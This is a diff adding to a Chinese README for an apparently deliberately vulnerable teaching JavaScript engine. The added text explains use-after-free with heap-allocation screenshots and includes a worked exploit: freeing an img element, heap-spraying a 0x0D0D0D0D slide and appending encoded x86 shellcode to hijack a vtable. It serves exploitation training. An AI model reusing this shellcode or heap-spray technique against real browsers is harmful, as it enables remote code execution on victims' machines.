@@ -103,8 +103,47 @@ Example 3 -- 简单的函数调用: <br/>
 
 ####1.UaF 原理部分(Use after Free ,重复使用已经被释放了的类)<br/><br/>
 所有的HTML 元素在浏览器的内部都是一个类的实例.在`vuln_javascript` 中,所有关于HTML 元素的操作都在`javascript_element.cpp` 这个文件里面.img 和div 元素继承HTML 基础元素,同时HTML 基础元素类向下提供一些HTML 元素的通用函数实现方法(也就是`getAttribute()` ,`setAttribute()` 和`remove()`).<br/>
-Uaf 的原理是:**当HTML 元素调用了remove() 删除自身并且在堆中释放内存之后,在接下来的代码执行流程中再次调用已经被释放的类时,将会引发释放后重用的漏洞(Use after Free)**<br/><br/>
+Uaf 的原理是:**当HTML 元素调用了remove() 删除自身并且在堆中释放内存之后,在接下来的代码执行流程中再次调用已经被释放的类时,将会引发释放后重用的漏洞(Use after Free)**,举个例子:<br/><br/>
+![heap_alloc_and_free](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/heap_alloc_and_free.png)<br/><br/>
+程序第一次做堆内存申请时,系统会返回申请成功的堆内存地址<br/><br/>
+![heap_alloc1](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/heap_alloc1.png)<br/><br/>
+接下来第二次堆内存申请也一样,只不过是要申请的大小不同<br/><br/>
+![heap_alloc2](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/heap_alloc2.png)<br/><br/>
+然后对`first_alloc` 的申请做了内存释放,最后又做了一次堆内存申请,结果系统返回的地址和第一次申请的地址一样<br/><br/>
+![heap_alloc3](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/heap_alloc3.png)<br/><br/>
+如果还没有理解UaF 的利用原理,那就看一下下面这几个例子:<br/><br/>
+在刚才的示例中,对最后申请的`thrid_alloc` 做了一次数据复制,最后的输出过程如下:<br/><br/>
+![uaf_data_change1](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/uaf_data_change1.png)<br/><br/>
+![uaf_data_change2](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/uaf_data_change2.png)<br/><br/>
+可以看到,对`thrid_alloc` 的操作影响到了`first_alloc` ,对于类的操作也同样适用,举个例子<br/><br/>
+![uaf_data_change3](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/uaf_data_change3.png)<br/><br/>
+利用UaF 漏洞来远程代码执行,其中的关键就是要修改虚函数表的地址,劫持对类的调用跳转到我们的ShellCode 中,关于C++ 的虚函数表的细节可以百度一下<br/><br/>
 
+Exapmle  -- img 对象UaF :<br/><br/>
+**Exploit** :<br/>
+```javascript
+function exp() {
+    var jumpcode='%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D%u0D0D';
+    var expcode='%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u006A%u2E68%u7865%u6865%u6163%u636C%ue589%u4dfe%u3153%u50c0%uff55%u00d7';
+    var shellcode_length=0x100000;
+    var rop='%u0D0D%u0D0D';
+    var rop_length=rop.length();
+    for (;rop_length<shellcode_length;rop_length=rop.length()) {
+        rop+=rop;
+    }
+    rop+=expcode;
+    console.log(rop.length());
+};
+
+var object=document.createElement('img');
+object.setAttribute('a',123);
+object.remove();
+exp();
+object.getAttribute('a');
+```
+代码`object.remove()` 产生了对象的释放,然后调用`exp()` 函数构造堆内存申请覆盖掉刚才`object` 对象在堆内的数据,控制虚函数表地址,让接下来的`object.getAttribute('a')` 调用刚才控制好的地址,跳转到**0x0D0D0D0D** ,最后通过堆喷射把ROP 在堆中大量占用,让ROP 其中一部分被分配到地址**0x0D0D0D0D** 处,于是执行ROP 代码最终滑行到`expcode` 中执行ShellCode ..<br/><br/>
+
+<br/><br/>
 
 ####2.Read /Write Out of Bound 原理部分(越界读写)<br/><br/>
 假设我们有两个数组:<br/><br/>
